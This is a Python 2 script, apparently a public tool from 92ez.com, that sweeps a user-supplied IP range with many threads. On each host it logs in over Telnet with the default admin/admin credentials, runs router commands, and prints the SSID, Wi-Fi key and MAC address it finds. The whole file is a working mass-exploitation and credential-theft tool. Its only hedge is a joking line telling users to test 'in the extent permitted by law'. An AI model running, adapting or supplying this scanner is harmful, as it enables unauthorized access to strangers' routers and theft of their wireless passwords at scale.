#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com
# last modify time 2016-02-19
# python telnetkey.py 1.1.1.1-1.1.2.1 200


from threading import Thread
import telnetlib
import subprocess
import requests
import Queue
import time
import json
import sys
import re

#ip to num
def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

#num to ip
def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)

#get list
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

#main function
def bThread(iplist):
    threadl = []
    queue = Queue.Queue()
    hosts = iplist
    j = 0
    for host in hosts:
        queue.put([host,j])
        j += 1

    threadl = [tThread(queue) for x in xrange(0, int(sys.argv[2]))]
    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#create thread
class tThread(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except Exception,e:
                continue

def getinfo(hostinfo):

    host = hostinfo[0]
    index = hostinfo[1]
    username = "admin"
    password = "admin"
    telnetTime = 5
    cmdTime = 3

    try:
        t = telnetlib.Telnet(host, timeout = telnetTime)
        #login
        t.read_until("username:", cmdTime)
        t.write(username + "\n")
        t.read_until("password:", cmdTime)
        t.write(password + "\n")

        #start exec cmd to get wifi info
        t.write("wlctl show\n")
        t.read_until("SSID", cmdTime)
        wifiStr = t.read_very_eager()

        #start exec cmd to get macaddree info
        t.write("lan show info\n")
        t.read_until("MACAddress", cmdTime)
        lanStr = t.read_very_eager()

        #close connection
        t.close()

        if len(wifiStr) > 0:
            
            #clear extra space
            wifiStr = "".join(wifiStr.split())
            #get SID KEY MAC
            SID = wifiStr[1:wifiStr.find('QSS')].encode('utf8')
            KEY = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')].encode('utf8') if wifiStr.find('Key=') != -1 else '无密码'
            MAC = lanStr[1:lanStr.find('__')].encode('utf8').replace('\n','')

            currentTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
            print '['+ str(index) +'/'+ str(TOTALIP) +'][Get] '+currentTime +'  ' +host +'  '+ SID +'  ' + KEY +'  '+MAC
    except:
        pass

if __name__ == '__main__':
    print 'Just make a test in the extent permitted by law  (^_^)'

    startIp = sys.argv[1].split('-')[0]
    endIp = sys.argv[1].split('-')[1]
    iplist = ip_range(startIp, endIp)

    global TOTALIP
    TOTALIP = len(iplist)
    print '\n[Note] Total '+str(TOTALIP)+" IP...\n"
    print '[Note] Running...\n'

    bThread(iplist)